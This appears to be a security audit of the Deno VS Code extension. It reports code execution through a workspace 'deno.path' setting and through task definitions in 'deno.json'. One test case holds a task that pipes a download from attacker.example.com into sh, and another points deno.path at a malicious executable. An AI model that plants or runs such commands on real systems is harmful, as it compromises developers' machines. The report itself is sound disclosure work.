# Vulnerabilities in VSCode Deno Extension

## 1. Remote Code Execution via deno.path Configuration

### Description
The Deno VS Code extension allows users to configure the path to the Deno executable through the `deno.path` setting. When the extension initializes, it uses this path to execute the Deno language server. If a malicious repository contains a `.vscode/settings.json` file with a crafted `deno.path` pointing to a malicious executable, opening the repository in VS Code will cause the extension to execute the malicious executable instead of the legitimate Deno CLI.

### Impact
Critical - This vulnerability enables an attacker to execute arbitrary code on the victim's machine with the privileges of the VS Code process, potentially leading to data theft, malware installation, or further system compromise.

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
The extension checks if a file exists at the specified path, but doesn't validate that the executable is actually the legitimate Deno CLI.

### Missing Mitigations
- The extension should validate that the executable is the legitimate Deno CLI by checking signatures or hashes
- Prompt for user confirmation when a non-default Deno path is specified in workspace settings
- Consider restricting the use of relative paths in the `deno.path` setting

### Preconditions
1. Victim must have the Deno VS Code extension installed
2. Victim must open a repository containing a malicious `.vscode/settings.json` file

### Source Code Analysis
The vulnerability exists in the `getDenoCommandPath` function in `client/src/util.ts`:

```typescript
export async function getDenoCommandPath() {
  const command = getWorkspaceConfigDenoExePath();  // Gets deno.path from settings
  const workspaceFolders = workspace.workspaceFolders;
  if (!command || !workspaceFolders) {
    return command ?? await getDefaultDenoCommand();
  } else if (!path.isAbsolute(command)) {
    // if sent a relative path, iterate over workspace folders to try and resolve.
    for (const workspace of workspaceFolders) {
      const commandPath = path.resolve(workspace.uri.fsPath, command);  // Resolves relative path
      if (await fileExists(commandPath)) {  // Checks if file exists
        return commandPath;  // Returns path to executable
      }
    }
    return undefined;
  } else {
    return command;  // Returns absolute path directly
  }
}
```

This function gets the path to the Deno executable from settings, resolves it if it's a relative path, and returns it. The path is then used in `startLanguageServer` function in `client/src/commands.ts`:

```typescript
export function startLanguageServer(...): Callback {
  return async () => {
    // ...
    const command = await getDenoCommandPath();  // Gets path to Deno executable
    if (command == null) {
      // ... (error handling)
      return;
    }
    // ...
    const serverOptions: ServerOptions = {
      run: {
        command,  // Uses path to execute language server
        args: ["lsp"],
        options: { env },
      },
      // ...
    };
    const client = new LanguageClient(
      LANGUAGE_CLIENT_ID,
      LANGUAGE_CLIENT_NAME,
      serverOptions,
      // ...
    );
    await client.start();  // Starts language server with specified command
    // ...
  };
}
```

The vulnerability allows an attacker-controlled value to be used directly as the executable path, resulting in arbitrary code execution.

### Security Test Case
1. Create a malicious executable that performs some easily detectable action (like creating a file or making a network request)
2. Create a repository with a `.vscode/settings.json` file containing:
   ```json
   {
     "deno.path": "/path/to/malicious/executable"
   }
   ```
3. Clone the repository to a test environment with VS Code and the Deno extension installed
4. Open the repository in VS Code
5. Verify that the malicious executable is executed instead of the Deno CLI

## 2. Command Injection via Task Execution from Configuration Files

### Description
The Deno VS Code extension allows execution of tasks defined in Deno configuration files (`deno.json`/`deno.jsonc`). These tasks are executed using the Deno CLI. A malicious repository can include configuration files with specially crafted task definitions that execute arbitrary commands when run.

### Impact
High - This vulnerability allows an attacker to execute arbitrary commands when a victim runs a task from the configuration file, potentially leading to data theft, malware installation, or further system compromise.

### Vulnerability Rank
High

### Currently Implemented Mitigations
Tasks are executed through the VS Code task system, which provides some level of isolation and visibility.

### Missing Mitigations
- The extension should validate task definitions and sanitize inputs before execution
- Warn users about potentially dangerous commands in tasks
- Consider running tasks in a more restricted environment

### Preconditions
1. Victim must have the Deno VS Code extension installed
2. Victim must open a repository with a malicious configuration file
3. Victim must manually execute a task from the Tasks view or run a specific command

### Source Code Analysis
The vulnerability exists in the task execution mechanism. Tasks are loaded from the Deno language server via the `task` request in `client/src/lsp_extensions.ts`:

```typescript
export const task = new RequestType0<
  TaskRequestResponse[] | undefined,
  void
>(
  "deno/taskDefinitions",  // Request to get task definitions
);
```

These tasks are then executed when a user triggers them. The `buildDenoConfigTask` function in `client/src/tasks.ts` builds a task from the configuration:

```typescript
export function buildDenoConfigTask(
  scope: vscode.WorkspaceFolder,
  process: string,  // Path to Deno executable
  name: string,     // Task name
  command: string | undefined,  // Task command (potentially malicious)
  sourceUri?: vscode.Uri,
): vscode.Task {
  const args = [];
  if (
    sourceUri &&
    vscode.Uri.joinPath(sourceUri, "..").toString() != scope.uri.toString()
  ) {
    const configPath = path.relative(scope.uri.fsPath, sourceUri.fsPath);
    args.push("-c", configPath);
  }
  args.push(name);
  const task = new vscode.Task(
    {
      type: TASK_TYPE,
      name: name,
      command: "task",
      args,
      sourceUri,
    },
    scope,
    name,
    TASK_SOURCE,
    new vscode.ProcessExecution(process, ["task", ...args]),  // Creates process execution
    ["$deno"],
  );
  task.detail = `$ ${command}`;  // Display the command to be executed
  return task;
}
```

When a user runs a task from the Tasks view, the tasks are executed via functions like:

```typescript
async #runTask(task: DenoTask) {
  tasks.executeTask(task.task);  // Executes the task
}
```

The vulnerability is that task definitions come directly from the configuration file without sufficient validation or sanitization, allowing arbitrary command execution if a user runs a malicious task.

### Security Test Case
1. Create a repository with a `deno.json` file containing:
   ```json
   {
     "tasks": {
       "malicious-task": "echo 'Compromised!' && curl http://attacker.example.com/payload | sh"
     }
   }
   ```
2. Clone the repository to a test environment with VS Code and the Deno extension installed
3. Open the repository in VS Code
4. Open the Command Palette and run "Tasks: Run Task"
5. Select "malicious-task" from the list
6. Verify that the malicious command is executed, which would make the HTTP request to the attacker's server and execute the downloaded payload
